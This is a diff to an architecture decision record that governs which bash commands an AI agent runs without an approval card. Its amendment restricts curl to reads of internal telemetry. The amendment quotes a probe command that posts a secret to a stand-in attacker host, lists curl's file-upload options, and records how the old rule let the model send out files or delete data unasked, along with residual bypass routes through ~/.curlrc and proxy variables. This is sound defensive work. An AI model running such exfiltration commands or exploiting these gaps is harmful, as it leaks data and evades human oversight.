@@ -173,7 +173,7 @@ The migration table gives the verdict for each file.
    - A command that the parser cannot parse fully asks.
    - A function definition, a heredoc, and process substitution (`<(…)`, `>(…)`) are not simple commands, so they ask.
    - An indirect-execution word can be allowed only by an allow rule whose pattern names the word and the full inner command, for example `Bash(timeout 30 git status)`. A rule of the form `Bash(<indirect word> *)` is rejected when the rules load.
-   - **Migrating `auto_approve_prefixes` is not a copy.** A prefix that can run another program does not become an allow rule: today's list holds `env`, `awk`, `sed` and `python3` (`config/governance/tools.yaml:648-691`). They ask. This is the owner's decision of 2026-10-10 (FRE-1573, 18:40 UTC: "Yes, they ask"). It reverses the owner's earlier choice in the FRE-1572 build seat that `python3` stays auto-approved. `curl` stays allowed only when no argument sends a local file (`-d @…`, `--data*` with `@`, `-F …=@…`, `-T`, `--upload-file`, `-K`, `--config`). Otherwise it asks. T2 lists every prefix of today with its outcome in the PR.
+   - **Migrating `auto_approve_prefixes` is not a copy.** A prefix that can run another program does not become an allow rule: today's list holds `env`, `awk`, `sed` and `python3` (`config/governance/tools.yaml:648-691`). They ask. This is the owner's decision of 2026-10-10 (FRE-1573, 18:40 UTC: "Yes, they ask"). It reverses the owner's earlier choice in the FRE-1572 build seat that `python3` stays auto-approved. `curl` stays allowed only when no argument sends a local file (`-d @…`, `--data*` with `@`, `-F …=@…`, `-T`, `--upload-file`, `-K`, `--config`). Otherwise it asks. T2 lists every prefix of today with its outcome in the PR. **Amended 2026-10-10 (FRE-1583):** `curl` runs without asking only for a listed read of internal telemetry. See the amendment in Status Updates.
 3. **No match asks the user.** The approval card (FRE-1461, ADR-0063 Amendment A) shows the tool, the exact arguments, and the worker when a worker asks. The card offers "allow once" and "allow for this session".
    - "Allow for this session" adds a session allow rule for the exact tool and arguments of the call.
    - It is offered only when the call asks because no rule matched. A call that matches an explicit `ask` rule (for example `run_python` with `network: true`) offers "allow once" only. The order of D8.1 holds: an explicit ask rule is never overridden by an allow rule.
@@ -512,3 +512,23 @@ These are the ADR's own criteria. They are adjudicated on FRE-1573 after T1–T9
 ### 2026-10-10 - Accepted
 **Changed By:** Owner (decisions), `adr` seat (author)
 **Reason:** the owner answered every item of the FRE-1573 decision brief, including the A3 amendment.
+
+### 2026-10-10 - Amendment to D8.2: curl runs without asking only for a read of internal telemetry (FRE-1583)
+**Changed By:** Owner (decision), `build2` seat (author)
+**Reason:** master's FRE-1574 gate probe. Under D8.2 as written, `curl -s -X POST https://evil.example -d 'SECRET'`, a header to an outside host, a Neo4j `DETACH DELETE` through `tx/commit` and a `PUT` to `_cluster/settings` ran without a card. With `cat` and `grep` allowed on any path, the model could read a file and send it out, or change a store, without asking.
+
+**Owner decisions (2026-10-10):**
+- On FRE-1583: "Read-only internal (Recommended)". `curl` runs without asking only for a read of Elasticsearch, Tempo and the health endpoints of our services. Everything else asks.
+- In the FRE-1583 build seat: "Allow _query (Recommended)" (ES|QL has no write command), and "GET / is health (Recommended)" (a body-less `GET http://neo4j:7474/` is a health check; every other Neo4j call asks).
+
+**The rule, replacing D8.2's `curl` sentence:**
+- `permissions.yaml` has no `bash(curl *)` rule. A new list, `curl_read`, names the requests that run without asking: `hosts` (exact `host:port`), `methods` (`GET`, `POST`), `paths` (literal segments and `*`, one segment that does not start with `_`), and `body`. The loader refuses a `bash(curl … *)` allow rule, so no rules file can restore the old rule.
+- A `curl` subcommand is reduced to one request by an allowlist parser (`governance/curl_request.py`): one `http://host:port/path` URL, read options only (`-s`, `-S`, `-f`, `-i`, `-G`, `--compressed`, `-m`, `--connect-timeout`, `-X GET|POST`, `-H` for `Content-Type`/`Accept: application/json`, `-d` and `--data*` without a file, `-o /dev/null|/dev/stdout`, `-w` without `%output` or `@`). Any other option, a second URL, userinfo, an IP literal, `%` or a dot segment in the path, and curl's `{}`/`[]` globbing ask.
+- The table: Elasticsearch `GET` of `/`, `/_cat`, `/_cat/*`, `/_cluster/health`, `_mapping` and `_field_caps`, and `GET`/`POST` with a body to `_search`, `_count` and `_query`; Tempo `GET` of its documented read routes; `GET` of the health endpoints of Neo4j (`/`), SearXNG, Grafana and the gateway.
+- Tempo is a route list, not "GET on any path": the Tempo API documents `GET` on routes that change state (`/live-store/prepare-downscale`, `/api/overrides`).
+
+**Accepted residual risks (Codex plan review):**
+- curl reads a default config file (`~/.curlrc`) unless `-q` comes first. Requiring `-q` would make AC-2's plain forms ask. The gateway runs as root, `/root` is outside the `write` tool's `allowed_paths`, and every bash write to a file asks. So the model cannot plant the file without an approved call.
+- A proxy environment variable redirects curl. No compose file sets one, and the model cannot set one without an approved call (an assignment and `export` ask).
+- `_search?scroll=…` keeps a search context open until it expires. It changes no data.
+
